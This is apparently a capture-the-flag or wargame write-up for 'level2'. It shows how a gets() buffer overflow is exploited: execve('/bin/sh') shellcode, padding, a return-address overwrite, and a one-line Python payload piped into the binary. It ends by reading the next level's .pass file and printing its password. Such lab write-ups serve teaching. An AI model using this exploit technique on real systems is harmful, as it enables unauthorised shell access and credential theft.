opening the program in a decompiler we can see it use gets which is vulnerable to a buffer overflow attack, we can use this to overwrite the return address of the function to the address of a function we put in memory, using the strdup the program is calling. (see source.c)
so basically, we will put in memory a shellcode that call execve("/bin/sh"), then we will overwrite the return address to the address of the shellcode.
from https://dhavalkapil.com/blogs/Shellcode-Injection:
`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80`
the buffer is 80 char long, our shellcode 25, so we need to add 55 char to the shellcode to fill the buffer, then we need to overwrite the return address with the address of the shellcode.
launching ./level2 with `ltrace` we can see that the address of the buffer is `0x0804a008`, so we add the address after the overflow so that the stack frame return address goes to our shellcode.

`python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' + 'a'*55 + '\x08\xa0\x04\x08'" > /tmp/a`
`cat /tmp/a - | ./level2`
and boom we can launch command as level3.
`cat /home/user/level3/.pass` -> `492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02`
